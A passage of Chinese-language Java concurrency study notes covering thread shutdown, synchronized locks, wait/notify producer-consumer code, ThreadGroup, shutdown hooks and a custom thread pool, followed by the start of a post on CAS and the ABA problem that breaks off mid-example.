{\n       long currentTime = System.currentTimeMillis();\n       while (!finished) {\n         if (System.currentTimeMillis() - currentTime >= miles) {\n           System.out.println(\"执行任务超时\");\n           executeThead.interrupt();\n           break;\n         }\n   \n         try {\n           // 短暂休眠，减少执行次数\n           Thread.sleep(1);\n         } catch (InterruptedException e) {\n           System.out.println(\"执行线程被打断\");\n           e.printStackTrace();\n         }\n       }\n     }\n   }\n   \n   ```\n\n   - 调用执行线程\n\n   ```java\n   public class ThreadCloseForce {\n     public static void main(String[] args) {\n       ThreadService threadService = new ThreadService();\n       long start = System.currentTimeMillis();\n       // 启动执行线程\n       threadService.execute(() -> {\n         while (true) {\n           // 模拟线程阻塞\n         }\n       });\n       // 超时验证\n       threadService.shutdown(10_000);\n       long end = System.currentTimeMillis();\n       System.out.println(end - start);\n     }\n   }\n   ```\n\n   - 执行结果\n\n   ```txt\n   执行任务超时\n   10117\n   执行任务的守护线程被打断\n   java.lang.InterruptedException\n   \tat java.lang.Object.wait(Native Method)\n   \tat java.lang.Thread.join(Thread.java:1252)\n   \tat java.lang.Thread.join(Thread.java:1326)\n   \tat com.hots.part1.chapter3.ThreadService$1.run(ThreadService.java:16)\n   \n   Process finished with exit code 0\n   ```\n\n## Chapter4：线程安全与数据同步\n\n### synchronized关键字\n\n> 使用synchronized需要注意的问题\n>\n> 1. 与monitor关联的对象不可为空\n>\n> 2. synchronized的作用域不可太大（降低执行效率）\n>\n> 3. 不同的monitor企图锁住相同的方法\n>\n> 4. 多个锁导致死锁\n\n### `this` monitor 和 `class` monitor\n\n1. 使用synchronized同步一个类的不同方法，争抢的是同一个锁（方法所属的对象的锁）：synchronied(this)\n\n   官方说明：\n\n   ```\n   When a thread invokes a synchronized method, it automatically acquires the intrinsic lock for that method's object and releases it when the method returns. \n   \n   The lock release occurs even if the return vas caused by an uncaught exception.\n   ```\n\n   \n\n2. 使用synchronized同步一个类的不同静态方法，争抢的是同一个锁（类的**class锁**）：synchronied(Test.class)\n\n   官方说明：\n\n   ```\n   since a static method is associated with a class, not an object.\n   In this case, the thread acquires the intrinsic lock for the Class object associated with the class. \n   Thus access to class'S static fields is controlled by a lock that's distinct from the lock for any instance of the class.\n   ```\n\n## Chapter5：线程之间的通信\n\nwait 、notify、notifyAll\n\n### wait 和 sleep和区别\n\n从表面上看，wait和sleep方法都可以使当前线程进人阻塞状态，但是两者之间存在着本质的区别，下面我们将总结两者的区别和相似之处\n\n- wait和sleep方法都可以使线程进人阻塞状态\n- wait和sleep方法均是可中断方法，被中断后都会收到中断异常。\n- **wait是Object的方法，而sleep是Thread特有的方法**\n- wait方法的执行必须在同步方法中进行，而sleep则不需要。\n- 线程在同步方法中执行sleep方法时，并不会释放的锁，而wait方法则会释放monitor的锁\n- sleep方法短暂休眠之后会主动退出阻塞，而wait方法（没有指定wait时间）则需要被其他线程中断后才能退出阻塞。\n\n###  单线程通信\n\n```java\npublic class ProducerAndConsumerVersion1 {\n\n    private int i = 0;\n\n    private volatile boolean isProduced = false;\n\n    private final Object LOCK = new Object();\n\n    private void produce() {\n        synchronized (LOCK) {\n            if (isProduced) {\n                try {\n                    LOCK.wait();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            } else {\n                ++i;\n                System.out.println(Thread.currentThread().getName() + \"：produced->\" + i);\n                LOCK.notify();\n                isProduced = true;\n            }\n        }\n    }\n\n    private void consume() {\n        synchronized (LOCK) {\n            if (isProduced) {\n                System.out.println(Thread.currentThread().getName() + \"：consumed->\" + i);\n                LOCK.notify();\n                isProduced = false;\n            } else {\n                try {\n                    LOCK.wait();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        ProducerAndConsumerVersion1 producerAndConsumerVersion1 = new ProducerAndConsumerVersion1();\n        new Thread(\"P1\") {\n            @Override\n            public void run() {\n                while (true) {\n                    producerAndConsumerVersion1.produce();\n                }\n            }\n        }.start();\n\n        new Thread(\"C1\") {\n            @Override\n            public void run() {\n                while (true) {\n                    producerAndConsumerVersion1.consume();\n                }\n            }\n        }.start();\n    }\n}\n```\n\n### 多线程通信\n\n![image-20211227170019463](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211227170019463.png) \n\n![image-20211227170133400](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211227170133400.png)  \n\n\n\n```java\n/**\n * Demo\n */\npublic class ProducerAndConsumerVersion3 {\n\n    private int i = 0;\n\n    private volatile boolean isProduced = false;\n\n    private final Object LOCK = new Object();\n\n    private void produce() {\n        synchronized (LOCK) {\n            while (isProduced) {\n                try {\n                    LOCK.wait();\n                    System.out.println(Thread.currentThread().getName() + \"：wait\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n            ++i;\n            System.out.println(Thread.currentThread().getName() + \"：produced->\" + i);\n            isProduced = true;\n            LOCK.notifyAll();\n        }\n    }\n\n    private void consume() {\n        synchronized (LOCK) {\n            while (!isProduced) {\n                try {\n                    LOCK.wait();\n                    System.out.println(Thread.currentThread().getName() + \"：wait\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            System.out.println(Thread.currentThread().getName() + \"：consumed->\" + i);\n            isProduced = false;\n            LOCK.notifyAll();\n        }\n    }\n\n    public static void main(String[] args) {\n        ProducerAndConsumerVersion3 producerAndConsumerVersion3 = new ProducerAndConsumerVersion3();\n        Stream.of(\"P1\", \"P2\").forEach(name -> {\n            new Thread(name) {\n                @Override\n                public void run() {\n                    while (true) {\n                        producerAndConsumerVersion3.produce();\n                        try {\n                            Thread.sleep(10);\n                        } catch (Exception e) {\n                            e.printStackTrace();\n                        }\n                    }\n                }\n            }.start();\n        });\n\n        Stream.of(\"C1\", \"C2\", \"C3\", \"C4\").forEach(name -> {\n            new Thread(name) {\n                @Override\n                public void run() {\n                    while (true) {\n                        producerAndConsumerVersion3.consume();\n                        try {\n                            Thread.sleep(100);\n                        } catch (Exception e) {\n                            e.printStackTrace();\n                        }\n                    }\n                }\n            }.start();\n        });\n    }\n}\n```\n\n### 自定义显示锁\n\n1. Lock接口\n\n```java\nimport java.util.Collection;\n\npublic interface Lock {\n    void lock() throws InterruptedException;\n\n    void lock(long mills) throws InterruptedException, TimeoutException;\n\n    void unLock();\n\n    Collection<Thread> getBlockedThread();\n\n    int getBlockedSize();\n\n    class TimeoutException extends Exception {\n        public TimeoutException(String message) {\n            super(message);\n        }\n    }\n}\n```\n\n2. 接口实现\n\n```java\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.Collections;\n\npublic class BooleanLock implements Lock {\n    private boolean initValue = false;\n\n    private Thread currentThread;\n\n    private Collection<Thread> blockedThreadCollection = new ArrayList<>();\n\n    @Override\n    public synchronized void lock() throws InterruptedException {\n        while (initValue) {\n            blockedThreadCollection.add(Thread.currentThread());\n            this.wait();\n        }\n        initValue = true;\n        currentThread = Thread.currentThread();\n        blockedThreadCollection.remove(Thread.currentThread());\n    }\n\n    @Override\n    public synchronized void lock(long mills) throws InterruptedException, TimeoutException {\n        if (mills <= 0) {\n            lock();\n        }\n        long waitMills = mills;\n        long endTime = System.currentTimeMillis() + waitMills;\n        while (initValue) {\n            if (waitMills <= 0) {\n                throw new TimeoutException(Thread.currentThread().getName() + \" waiting timeout\");\n            }\n            // 重新设置等待时间\n            this.wait(waitMills);\n            waitMills = endTime - System.currentTimeMillis();\n        }\n\n        this.initValue = true;\n        this.currentThread = Thread.currentThread();\n    }\n\n    @Override\n    public synchronized void unLock() {\n        if (Thread.currentThread() == currentThread) {\n            initValue = false;\n            System.out.println(Thread.currentThread().getName() + \" release the monitor\");\n            this.notifyAll();\n        }\n    }\n\n    @Override\n    public Collection<Thread> getBlockedThread() {\n        return Collections.unmodifiableCollection(blockedThreadCollection);\n    }\n\n    @Override\n    public int getBlockedSize() {\n        return blockedThreadCollection.size();\n    }\n}\n```\n\n3. 调用\n\n```java\nimport java.util.Arrays;\n\npublic class BooleanLockTest {\n    public static void main(String[] args) {\n        final BooleanLock booleanLock = new BooleanLock();\n\n        Arrays.asList(\"W1\", \"W2\", \"W3\").stream()\n                .forEach(name -> {\n                    new Thread(() -> {\n                        try {\n                            booleanLock.lock(5_000);\n                            System.out.println(Thread.currentThread().getName() + \" got the lock\");\n                            work();\n                        } catch (InterruptedException | Lock.TimeoutException e) {\n                            e.printStackTrace();\n                        } finally {\n                            booleanLock.unLock();\n                        }\n                    }, name).start();\n                });\n\n    }\n\n    public static void work() throws InterruptedException {\n        System.out.println(Thread.currentThread().getName() + \" is working...\");\n        Thread.sleep(10_000);\n    }\n}\n```\n\n## Chapter6：Thread Group\n\n### Thread 与 ThreadGroup\n\n![image-20211228162829691](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211228162829691.png)  \n\n### 基本操作\n\n| 方法                    | 说明                                                         |\n| ----------------------- | ------------------------------------------------------------ |\n| activeCount()           | 用于获取group中活跃的线程，这只是个估计值，并不能百分之百地保证数字一定正确，原因前面已经分析过，该方法会递归获取其他子group中的活跃线程。 |\n| activeGroupCount()      | 用于获取group中活跃的子group，这也是一个近似估值，该方法也会递归获取所有的子group。 |\n| getMaxPriority()        | 用于获取group的优先级，默认情况下，Group的优先级为10，在该group中，所有线程的优先级都不能大于group的优先级 |\n| getName()               | 用于获取group的名字。                                        |\n| getParent()             | 用于获取group的父group，如果父group不存在，则会返回null，比如systemgroup的父group就为null。 |\n| list()                  | 该方法没有返回值，执行该方法会将group中所有的活跃线程信息全部输出到控制台，也就是System.out0 |\n| parentOf(ThreadGroup g) | 会判断当前group是不是给定group的父group，另外如果给定的group就是自己本身，那么该方法也会返回true。 |\n| setMaxPriority(int pri) | 会指定group的最大优先级，最大优先级不能超过父group的最大优先级，执行该方法不仅会改变当前group的最大优先级，还会改变所有子group的最大优先级 |\n\n### 守护ThreadGroup\n\n`public final void setDaemon(boolean daemon)`\n\n```\nFirst, the checkAccess method of this thread group is called with no arguments; \nthis may result in a security exception.\nA daemon thread group is automatically destroyed when its last thread is stopped or its last thread group is destroyed\n```\n\n```java\n/**\n * Demo\n */\npublic class ThreadGroupApi {\n    public static void main(String[] args) throws InterruptedException {\n        ThreadGroup tg1 = new ThreadGroup(\"group1\");\n        new Thread(tg1, () -> {\n            try {\n                Thread.sleep(1_000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }, \"group1-t1\").start();\n\n        ThreadGroup tg2 = new ThreadGroup(\"group2\");\n        new Thread(tg2, () -> {\n            try {\n                Thread.sleep(1_000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }, \"group2-t1\").start();\n        tg2.setDaemon(true);\n\n        Thread.sleep(1_000);\n\n        System.out.println(tg1.getName() + \" -- \" + tg1.isDestroyed());// false\n        System.out.println(tg2.getName() + \" -- \" + tg2.isDestroyed());// true\n      \n        tg1.destroy(); // 显示销毁\n\n        System.out.println(tg1.getName() + \" -- \" + tg1.isDestroyed());// true\n        System.out.println(tg2.getName() + \" -- \" + tg2.isDestroyed());// true\n    }\n}\n```\n\n## Chapter7：Hook线程以及捕获线程执行异常\n\n### 获取线程运行时异常\n\n####  处理Thread运行时异常API，有四个\n\n| 方法                                                         | 说明                                         |\n| ------------------------------------------------------------ | -------------------------------------------- |\n| public static void  **setDefaultUncaughtExceptionHandler**(Thread.UncaughtExceptionHandler eh) | 设置全局的UncaughtExceptionHandler           |\n| public static  Thread.UncaughtExceptionHandler **getDefaultUncaughtExceptionHandler**() | 获取全局的UncaughtExceptionHandler           |\n| public void  setUncaughtExceptionHandler(Thread.UncaughtExceptionHandler eh) | 为某个特定线程指定UncaughtExceptionHandler   |\n| public Thread.UncaughtExceptionHandler  getUncaughtExceptionHandler() | 获取某个特定线程指定UncaughtExceptionHandler |\n\n其中UncaughtExceptionHandler 是一个FunctionalInterface接口，仅包含一个抽象方法。\n\n```java\n@FunctionalInterface\npublic interface UncaughtExceptionHandler {\n  /**\n         * Method invoked when the given thread terminates due to the\n         * given uncaught exception.\n         * <p>Any exception thrown by this method will be ignored by the\n         * Java Virtual Machine.\n         * @param t the thread\n         * @param e the exception\n         */\n  void uncaughtException(Thread t, Throwable e);\n}\n```\n\n该回调接口会被`Thread`和`dispatchUncaughtException`调用。\n\n```java\n/**\n * Dispatch an uncaught exception to the handler. This method is\n * intended to be called only by the JVM.\n */\nprivate void dispatchUncaughtException(Throwable e) {\n  getUncaughtExceptionHandler().uncaughtException(this, e);\n}\n```\n\n####  UncaughtExceptionHandler实例\n\n测试类\n\n```java\npublic class CaptureThreadException {\n    public static void main(String[] args) {\n\n        // 1. 设置回调接口\n        Thread.setDefaultUncaughtExceptionHandler((t, e) -> {\n            System.out.println(t.getName() + \" ----- occur exception：\" + e.getMessage());\n            e.printStackTrace();\n        });\n\n        new Thread(() -> {\n            try {\n                Thread.sleep(1_000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n            // 2. 抛出运行时异常\n            System.out.println(1 / 0);\n        }).start();\n    }\n}\n```\n\n输出结果\n\n```bash\nThread-0 ----- occur exception：/ by zero\njava.lang.ArithmeticException: / by zero\n\tat com.hots.chapter7.CaptureThreadException.lambda$main$1(CaptureThreadException.java:20)\n\tat java.lang.Thread.run(Thread.java:748)\n\nProcess finished with exit code 0\n```\n\n\n\n####  UncaughtExceptionHandler源码分析\n\n1. 获取Thread的UncaughtExceptionHandler\n\n   ```java\n   private void dispatchUncaughtException(Throwable e) {\n     getUncaughtExceptionHandler().uncaughtException(this, e);\n   }\n   ```\n\n2. Thread未设置UncaughtExceptionHandler，则找ThreadGroup获取\n\n   ```java\n   public UncaughtExceptionHandler getUncaughtExceptionHandler() {\n     return uncaughtExceptionHandler != null ?\n       uncaughtExceptionHandler : group;\n   }\n   ```\n\n   > ThreadGroup 是 Thread.UncaughtExceptionHandler 的实现类\n\n3. ThreadGroup的uncaughtException\n\n   ```java\n   public void uncaughtException(Thread t, Throwable e) {\n   \tif (parent != null) {\n   \t\tparent.uncaughtException(t, e); // 调用父ThreadGroup的uncaughtException\n   \t} else {\n   \t\tThread.UncaughtExceptionHandler ueh =\n   \t\t\tThread.getDefaultUncaughtExceptionHandler(); \n   \t\tif (ueh != null) {\n   \t\t\tueh.uncaughtException(t, e); // 调用全局默认的UncaughtExceptionHandler\n   \t\t} else if (!(e instanceof ThreadDeath)) {\n   \t\t\tSystem.err.print(\"Exception in thread \\\"\" + t.getName() + \"\\\" \");\n   \t\t\te.printStackTrace(System.err);// 将异常的堆栈信息定向到System.err中\n   \t\t}\n   \t}\n   }\n   ```\n\n```mermaid\n   graph LR\n   A[线程异常] -->  B(MainGroup) --> C(System Group) --> D[System.err]\n```\n\n\n\n### 注入Hook线程\n\n#### Hook线程概念\n\nJVM进程的退出是由于JVM进程中没**有活跃的非守护线程**，或者收到了**系统中断信号**。\n\n**向JVM程序注入一个Hook线程，在JVM进程退出的时候，Hook线程会启动执行。**\n\n通过Runtime可以为JVM注人多个Hook线程。\n\n#### Linux 模拟Hook简单调用\n\n==Runtime.getRuntime().addShutdownHook(Thread hook));==\n\n```sh\n[root@hots java]# mkdir /root/java\n[root@hots java]# vi ExitCapture.java #内容如下\n```\n\n```java\npublic class ExitCapture{\n\tpublic static void main(String[] args){\n    \n\t\tRuntime.getRuntime().addShutdownHook(new Thread(() -> {\n\t\t\tSystem.out.println(Thread.currentThread().getName() + \" exiting......\");\n      // 进程down之前的安全处理措施\n\t\t\tnotifyAndRelease();\n\t\t}));\n    \n\t\tint i = 0;\n\t\twhile(true){\n\t\t\t++i;\n\t\t\ttry{\n\t\t\t\tThread.sleep(1_000L);\n\t\t\t\tSystem.out.println(Thread.currentThread().getName() + \" working....\");\n\t\t\t} catch (Throwable e) {\n\t\t\t}\n\t\t\tif (i > 10) {\n\t\t\t\tthrow new RuntimeException(Thread.currentThread().getName() + \" error\");\n\t\t\t}\n\t\t}\n\t}\n\t\n\tprivate static void notifyAndRelease(){\n\t\tSystem.out.println(Thread.currentThread().getName() + \" notify other matchine and release resource\");\n\t\ttry {\n\t\t\tThread.sleep(1_000L);\n\t\t} catch(Exception e) {\t\n\t\t}\n\t\tSystem.out.println(Thread.currentThread().getName() + \"finish exit.\");\n\t}\n}  \n```\n\n```sh\n[root@hots java]# javac ExitCapture.java\n[root@hots java]# java ExitCapture\n```\n\n> \\# 后台运行，日志记录到nohup.out文件\n>\n> nohup java -cp . ExitCapture & \n\n10秒后程序退出 / Ctrl+C 退出程序 / kill 进程号\n\n```sh\n[root@hots java]# java ExitCapture  \nmain working....\nmain working....\nmain working....\nmain working....\nmain working....\nmain working....\n^CThread-0 exiting......\nThread-0 notify other matchine and release resource\nmain working....\nThread-0finish exit.\n[1]+  Exit 1              \n```\n\n> kill -9 进程号 会直接退出，钩子程序不会执行。\n\n\n\n#### Hook线程实际应用举例\n\n在我们的开发中经常会遇到Hook线程，比如为了防止某个程序被重复启动，在进程启动时会创建一个文件，进程收到中断信号的时候会删除这个lock文件，我们在MySQL服务器、zookeeper、kafka等系统中都能看到lock文件的存在。\n\n```java\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class PreventDuplicated {\n    private static final String LOCK_PATH = \"E:\\\\Downloads\";\n\n    private static final String LOCK_FILE = \".lock\";\n\n    private static final String PERMISSIONS = \"rw-------\";\n\n    public static void main(String[] args) {\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            // 程序退出，删除lock文件\n            System.out.println(\"deal program shutdown...\");\n            getLockFile().toFile().delete();\n        }));\n\n        // 判断Lock文件，存在，抛重复执行异常，不存在继续\n        checkLockFile();\n        //程序执行\n        try {\n            Thread.sleep(20_000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void checkLockFile() {\n        Path path = getLockFile();\n        if (path.toFile().exists()) {\n            throw new RuntimeException(\"The program already running.\");\n        }\n        try {\n            Files.createFile(path);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static Path getLockFile() {\n        return Paths.get(LOCK_PATH, LOCK_FILE);\n    }\n}\n```\n\n\n\n## Chapter8：线程池原理以及自定义线程池\n\n```java\nimport java.util.ArrayList;\nimport java.util.Iterator;\nimport java.util.LinkedList;\nimport java.util.List;\n\n/**\n * 线程池模拟类 \n */\npublic class SimpleThreadPool extends Thread {\n    /* 线程池现有容量：包含FREE, RUNNING, BLOCKED 三种状态的线程 */\n    private int poolSize;\n\n    private static volatile int seq = 0;\n\n    private static final String THREAD_PREFIX = \"SIMPLE_THREAD_POOL-\";\n\n    private final int queueSize;\n\n    /* 默认TASK_QUEUE的阈值 */\n    public final static int DEFAULT_TASK_QUEUE_SIZE = 2000;\n\n    private final static LinkedList<Runnable> TASK_QUEUE = new LinkedList<>();\n\n    private final static ThreadGroup GROUP = new ThreadGroup(\"Pool_Group\");\n\n    private final static List<MyThread> THREAD_QUEUE = new ArrayList<>();\n\n    private final DiscardPolicy discardPolicy;\n\n    // 线程池，无能力处理，策略\n    public final static DiscardPolicy DEFAULT_DISCARD_POLICY = () -> {\n        throw new DiscardException(\"Discard this task\");\n    };\n\n    // 线程池，销毁标记\n    private volatile boolean destroy = false;\n\n    private final int minPoolSize;\n\n    public static final int DEFAULT_MIN_POOL_SIZE = 4;\n\n    private final int activePoolSize;\n\n    public static final int DEFAULT_ACTIVE_POOL_SIZE = 8;\n\n    private final int maxPoolSize;\n\n    public static final int DEFAULT_MAX_POOL_SIZE = 12;\n\n    public SimpleThreadPool() {\n        this(DEFAULT_MIN_POOL_SIZE, DEFAULT_ACTIVE_POOL_SIZE, DEFAULT_MAX_POOL_SIZE, DEFAULT_TASK_QUEUE_SIZE, DEFAULT_DISCARD_POLICY);\n    }\n\n    public SimpleThreadPool(int minPoolSize, int activePoolSize, int maxPoolSize, int queueSize, DiscardPolicy discardPolicy) {\n        this.minPoolSize = minPoolSize;\n        this.activePoolSize = activePoolSize;\n        this.maxPoolSize = maxPoolSize;\n\n        this.queueSize = queueSize;\n        this.discardPolicy = discardPolicy;\n\n        // 初始化，最小容量线程池\n        for (int i = 0; i < minPoolSize; i++) {\n            createMyThread();\n        }\n        // 自定义线程池，同时也是一个线程，可以根据工作量，自动调整容量\n        this.setName(THREAD_PREFIX + \"head\");\n        this.start();\n        resetPoolSize();\n    }\n\n    private void createMyThread() {\n        MyThread myThread = new MyThread(GROUP, THREAD_PREFIX + (seq++));\n        THREAD_QUEUE.add(myThread);\n        myThread.start();\n    }\n\n    /**\n     * 获取线程池大小：每次线程池，新增/销毁线程的时候，调用\n     */\n    private void resetPoolSize() {\n        this.poolSize = THREAD_QUEUE.size();\n    }\n\n    /**\n     * 线程池，根据工作量，自动调整容量\n     */\n    @Override\n    public void run() {\n        while (!destroy) {\n            // 扩展线程池\n            if (TASK_QUEUE.size() > activePoolSize && poolSize < activePoolSize) {\n                for (int i = poolSize; i < activePoolSize; i++) {\n                    createMyThread();\n                }\n                System.out.println(\"The pool increased to activePoolSize.\");\n                resetPoolSize();\n            }\n            if (TASK_QUEUE.size() > maxPoolSize && poolSize < maxPoolSize) {\n                for (int i = poolSize; i < maxPoolSize; i++) {\n                    createMyThread();\n                }\n                System.out.println(\"The pool increased to maxPoolSize.\");\n                resetPoolSize();\n            }\n\n            // 缩减线程池\n            synchronized (THREAD_QUEUE) {\n                if (TASK_QUEUE.isEmpty()\n                        && THREAD_QUEUE.stream().filter(e -> e.taskStatus == TaskStatus.RUNNING).count() == 0\n                        && poolSize > activePoolSize) {\n                    int releaseCount = poolSize - activePoolSize;\n                    Iterator<MyThread> it = THREAD_QUEUE.iterator();\n                    while (it.hasNext()) {\n                        if (releaseCount <= 0) {\n                            break;\n                        }\n                        MyThread myThread = it.next();\n                        myThread.close();\n                        myThread.interrupt();\n                        it.remove();\n                        --releaseCount;\n                        System.out.println(myThread.getName() + \" had been released\");\n                    }\n                    resetPoolSize();\n                }\n            }\n        }\n        System.out.println(Thread.currentThread().getName() + \"---- is dead\");\n    }\n\n    public void shutDown() throws InterruptedException {\n        // 等待现有线程池中任务执行完成\n        while (!TASK_QUEUE.isEmpty() || THREAD_QUEUE.stream().filter(e -> e.taskStatus == TaskStatus.RUNNING).count() > 0) {\n            Thread.sleep(50);\n        }\n\n        synchronized (THREAD_QUEUE) {\n            // 进行关停销毁\n            System.out.println(\"The pool is ready to destroy\");\n            Iterator<MyThread> it = THREAD_QUEUE.iterator();\n            while (it.hasNext()) {\n                MyThread myThread = it.next();\n                if (myThread.taskStatus == TaskStatus.BLOCKED) {\n                    // waiting中的线程\n                    myThread.close();\n                    myThread.interrupt();\n                    it.remove();\n                }\n            }\n            System.out.println(\"The thread pool disposed\");\n            resetPoolSize();\n            destroy = true;\n        }\n\n        System.out.println(\"All threads had been destroyed\");\n    }\n\n    public void submit(Runnable runnable) {\n        if (destroy)\n            throw new IllegalStateException(\"The thread pool already destroy and not allow submit task.\");\n\n        synchronized (TASK_QUEUE) {\n            if (TASK_QUEUE.size() > queueSize) {\n                // 处理能力之外的任务，处理措施\n                discardPolicy.discard();\n            }\n            TASK_QUEUE.addLast(runnable);\n            TASK_QUEUE.notifyAll();\n        }\n\n    }\n\n    public interface DiscardPolicy {\n        void discard() throws DiscardException;\n    }\n\n    public static class DiscardException extends RuntimeException {\n        public DiscardException(String message) {\n            super(message);\n        }\n    }\n\n    public enum TaskStatus {\n        FREE, RUNNING, BLOCKED, DEAD;\n    }\n\n    private class MyThread extends Thread {\n        private volatile TaskStatus taskStatus = TaskStatus.FREE;\n\n        public MyThread(ThreadGroup group, String name) {\n            super(group, name);\n        }\n\n        @Override\n        public void run() {\n            OUTER:\n            while (this.taskStatus != TaskStatus.DEAD) {\n                Runnable runnable = null;\n                synchronized (TASK_QUEUE) {\n                    while (TASK_QUEUE.isEmpty()) {\n                        try {\n                            // 任务队列为空，线程等待，让出monitor\n                            this.taskStatus = TaskStatus.BLOCKED;\n                            TASK_QUEUE.wait();\n                        } catch (InterruptedException e) {\n                            // 任务队列存入数据，被唤醒，重新抢锁处理\n                            break OUTER;\n                        }\n                    }\n                    runnable = TASK_QUEUE.removeFirst();\n                }\n\n                if (runnable != null) {\n                    this.taskStatus = TaskStatus.RUNNING;\n                    runnable.run();\n                    this.taskStatus = TaskStatus.FREE;\n                }\n            }\n        }\n\n        public void close() {\n            this.taskStatus = TaskStatus.DEAD;\n        }\n    }\n}\n```\n\n```java\nimport java.util.stream.IntStream;\n\n/**\n * 线程池测试类\n */\npublic class SimpleThreadTest {\n    public static void main(String[] args) throws InterruptedException {\n        SimpleThreadPool threadPool = new SimpleThreadPool();\n        IntStream.rangeClosed(0, 40)\n                .forEach(index -> {\n                    threadPool.submit(() -> {\n                                try {\n                                    Thread.sleep(1_000L);\n                                    System.out.println(\"Task \" + index + \" be serviced by \" + Thread.currentThread().getName());\n                                } catch (InterruptedException e) {\n                                    e.printStackTrace();\n                                }\n                            }\n                    );\n                });\n        // Thread.sleep(10_000);\n        threadPool.shutDown();\n    }\n}\n\n```\n\n\n\n","tags":["Java"],"categories":["后端","Java"]},{"title":"Java并发包","url":"/20250619/3c508c34.html","content":"\n\n\n#  Atomic包\n\n## CAS(Compare And Swap)：比较并交换\n\n`CAS`即`Compare And Swap`的缩写，翻译成中文就是**比较并交换**，其作用是让CPU比较内存中某个值是否和预期的值相同，如果相同则将这个值更新为新值，不相同则不做更新，也就是CAS是**原子性**的操作(读和写两者同时具有原子性)，其实现方式是通过借助`C/C++`调用CPU指令完成的，所以效率很高。(使用的是最快失败策略)\n `CAS`的原理很简单，这里使用一段`Java`代码来描述\n\n```java\npublic boolean compareAndSwap(int value, int expect, int update) {\n    // 如果内存中的值value和期望值expect一样 则将值更新为新值update\n    if (value == expect) {\n        value = update;\n        return true;\n    } else {\n        return false;\n    }\n}\n```\n\n大致过程是将内存中的值、我们的期望值、新值交给CPU进行运算，如果内存中的值和我们的期望值相同则将值更新为新值，否则不做任何操作。这个过程是在CPU中完成的，这里不好描述CPU的工作过程，就拿Java代码来描述了。\n\n### Unsafe源码分析\n\n​    Java是在`Unsafe(sun.misc.Unsafe)`类实现`CAS`的操作，而我们知道Java是无法直接访问操作系统底层的API的（原因是Java的跨平台性限制了Java不能和操作系统耦合），所以Java并没有在`Unsafe`类直接实现`CAS`的操作，而是通过**JDI(Java Native Interface)**本地调用`C/C++`语言来实现`CAS`操作的。\n\n `Unsafe`有很多个`CAS`操作的相关方法，这里举例几个\n\n```java\npublic final native boolean compareAndSwapObject(Object var1, long var2, Object var4, Object var5);\n\npublic final native boolean compareAndSwapInt(Object var1, long var2, int var4, int var5);\n\npublic final native boolean compareAndSwapLong(Object var1, long var2, long var4, long var6);\n```\n\n我们拿`public final native boolean compareAndSwapInt(Object var1, long var2, int var4, int var5);`进行分析\n\n这个方法是比较内存中的一个值（整型）和我们的期望值（var4）是否一样，如果一样则将内存中的这个值更新为`var5`，参数中的`var1`是值所在的对象，`var2`是值在对象(var1)中的内存偏移量，**参数var1和参数var2是为了定位出值所在内存的地址**。\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/7126254-55d47d5ebef3b1e2-16380810237142.webp) \n\n**Unsafe.java在这里发挥的作用有：**\n\n1. 将对象引用、值在对象中的偏移量、期望的值和欲更新的新值传递给`Unsafe.cpp`\n2. 如果值更新成功则返回`true`给开发者，没有更新则返回`false`\n\n**Unsafe.cpp在这里发挥的作用有：**\n\n1. 接受从`Unsafe`传递过来的对象引用、偏移量、期望的值和欲更新的新值，根据对象引用和偏移量**计算出值的地址**，然后将值的地址、期望的值、欲更新的新值传递给CPU\n2. 如果值更新成功则返回`true`给`Unsafe.java`，没有更新则返回`false`\n\n**CPU在这里发挥的作用：**\n\n1. 接受从`Unsafe.cpp`传递过来的地址、期望的值和欲更新的新值，执行指令`cmpxchg`，比较地址中的值是否和期望的值一样，一样则将值更新为新的值，不一样则不做任何操作\n2. 将操作结果返回给`Unsafe.cpp`\n\n### CAS的缺点：ABA\n\n**`ABA`说明**\n\n> 在多线程场景下`CAS`会出现`ABA`问题，关于ABA问题这里简单科普下，例如有2个线程同时对同一个值(初始值为A)进行CAS操作，这三个线程如下\n>\n> 1. 线程1，期望值为A，欲更新的值为B\n> 2. 线程2，期望值为A，欲更新的值为B\n> 3. 线程3，期望值为B，欲更新的值为A\n>\n> 线程`1`抢先获得CPU时间片，而线程`2`因为其他原因阻塞了；线程`1`取值与期望的A值比较，发现相等然后将值更新为B；\n>\n> 这个时候**出现了线程`3`**，线程3取值与期望的值B比较，发现相等则将值更新为A；\n>\n> 此时线程`2`从阻塞中恢复，并且获得了CPU时间片，这时候线程`2`取值与期望的值A比较，发现相等则将值更新为B\n>\n> 虽然线程`2`也完成了操作，但是线程`2`并不知道值已经经过了`A->B->A`的变化过程。\n\n**`ABA`问题带来的危害**\n\n > 小明在提款机，提取了50元，因为提款机问题，有两个线程，同时把余额从100变为50\n >\n >\n > - 线程1（提款机）：获取当前值100，期望更新为50，\n >\n > - 线程2（提款机）：获取当前值100，期望更新为50，\n >\n > 线程1成功执行，线程2某种原因block了，这时，某人给小明汇款50\n >\n > - 线程3（某人）：获取当前值50，期望更新为100，\n >\n > 这时候线程3成功执行，余额变为100，\n > 线程2从Block中恢复，获取到的也是100，compare之后，继续更新余额为50\n >\n > **此时可以看到，实际余额应该为100（100-50+50），但是实际上变为了50（100-50+50-50）这就是ABA问题带来的成功提交。**\n\n```java\n@Test\npublic void testAtomicReference() throws InterruptedException {\n  final Integer moneyTotal = 100;\n  AtomicInteger money = new AtomicInteger(moneyTotal);\n\n  Thread t1 = new Thread(() -> {\n    